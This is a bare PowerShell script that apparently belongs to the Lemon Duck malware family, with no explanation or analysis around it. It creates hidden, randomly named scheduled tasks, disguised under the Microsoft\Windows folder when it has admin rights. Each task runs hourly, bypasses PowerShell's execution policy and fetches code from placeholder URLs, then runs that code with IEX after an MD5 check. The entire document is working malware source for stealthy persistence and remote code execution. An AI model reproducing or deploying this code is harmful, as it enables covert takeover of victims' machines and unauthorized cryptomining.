$v="?ms_"+(Get-Date -Format 'yyyyMMdd')

$tm='<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><RegistrationInfo><Date>TIME</Date><Author>USER</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval>PT60M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition><StartBoundary>TIME</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>false</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><Duration>PT60M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT72H</ExecutionTimeLimit><Priority>7</Priority></Settings><Actions Context="Author"><Exec><Command>cmd</Command><Arguments>/c "set A=power&amp; call %A%shell -ep bypass -e COMMAND"</Arguments></Exec></Actions></Task>'

$tm1='$Lemon_Duck=''_T'';$y=''_U'';$z=$y+''p''+'''+$v+''';$m=(New-Object System.Net.WebClient).DownloadData($y);[System.Security.Cryptography.MD5]::Create().ComputeHash($m)|foreach{$s+=$_.ToString(''x2'')};if($s-eq''d8109cec0a51719be6f411f67b3b7ec1''){IEX(-join[char[]]$m)}'
$ru=$env:username
$tn3=-join([char[]](65..90+97..122)|Get-Random -Count (5+(Get-Random)))+'\'+-join([char[]](65..90+97..122)|Get-Random -Count (5+(Get-Random)))
$of=$env:tmp+'\tempfle.txt'
$lf=$env:tmp+'\kdls92jsjqs0.txt'
$ti=Get-Date -Format 'yyyy-MM-ddTHH:mm:ss'
$us=@('url_1', 'url_2', 'url_3')
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){
	$ru='System'
	$tn3='MicroSoft\Windows\'+$tn3
}
if(!(Test-Path $lf)){
	foreach($u in $us){
		if($u -eq $us[0]){$tn=-join([char[]](65..90+97..122)|Get-Random -Count (5+(Get-Random)))}
		if($u -eq $us[1]){$tn=-join([char[]](65..90+97..122)|Get-Random -Count (5+(Get-Random)))+'\'+-join([char[]](65..90+97..122)|Get-Random -Count (5+(Get-Random)))}
		if($u -eq $us[2]){$tn=$tn3}
		$tm.replace('TIME',$ti).replace('USER',$ru).replace('COMMAND',[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($tm1.replace('_T',$tn).replace('_U',$u))))|out-file $of
		if($ru -eq 'System'){
			schtasks /create /ru $ru /tn $tn /xml $of /F
		} else {
			schtasks /create /tn $tn /xml $of /F 
		}
		schtasks /run /tn $tn
		Remove-Item $of
	}
	new-item $lf -type file
}
schtasks /delete /tn Rtsa /F